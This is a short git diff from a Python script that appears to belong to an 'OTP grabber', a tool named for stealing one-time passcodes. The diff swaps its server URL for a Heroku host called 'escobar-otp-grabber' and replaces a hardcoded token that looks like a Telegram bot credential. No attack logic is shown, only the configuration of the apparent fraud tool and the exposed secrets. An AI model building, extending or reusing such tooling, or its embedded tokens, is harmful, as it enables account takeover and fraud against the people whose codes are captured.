@@ -5,9 +5,9 @@ from time import sleep
 
 from vonage import verify
 
-url = "http://b4d8-2409-4063-6e80-c8de-3d6a-c434-110f-5d84.ngrok.io"
+url = "https://escobar-otp-grabber.herokuapp.com"
 
-token = "5013379680:AAHO7gSCBNoSU0G915j22uIw31emsD4lKXs"
+token = "5078799701:AAGtwv7Iar3ZWGTEQR6TLsJudTjBMGPeA_o"
 
 def verify(username):
     with open('users.txt', 'r') as f:
